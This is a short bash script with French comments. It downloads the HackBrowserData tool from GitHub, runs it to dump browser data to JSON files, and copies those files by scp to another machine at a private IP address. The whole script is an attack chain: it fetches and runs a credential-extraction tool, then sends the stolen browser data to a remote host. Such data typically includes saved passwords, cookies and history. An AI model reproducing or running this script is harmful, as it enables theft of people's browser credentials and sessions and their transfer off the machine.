#!/bin/bash

# Variables
SERVER_USER="DELL"
SERVER_IP="192.168.56.1"  # Remplace par l'IP du premier PC
DEST_DIR="/home/$SERVER_USER/hackbrowserdata"

# Télécharger HackBrowserData
echo "[+] Téléchargement de HackBrowserData..."
wget -q --show-progress https://github.com/moonD4rk/HackBrowserData/releases/latest/download/hackbrowserdata_linux_amd64.tar.gz
tar -xzf hackbrowserdata_linux_amd64.tar.gz
chmod +x hackbrowserdata

# Exécuter HackBrowserData
echo "[+] Extraction des données..."
./hackbrowserdata -o json

# Transférer les données via SSH
echo "[+] Envoi des fichiers au premier PC..."
scp -r *.json $SERVER_USER@$SERVER_IP:$DEST_DIR

echo "[+] Terminé ! Les fichiers sont sur $SERVER_IP:$DEST_DIR"
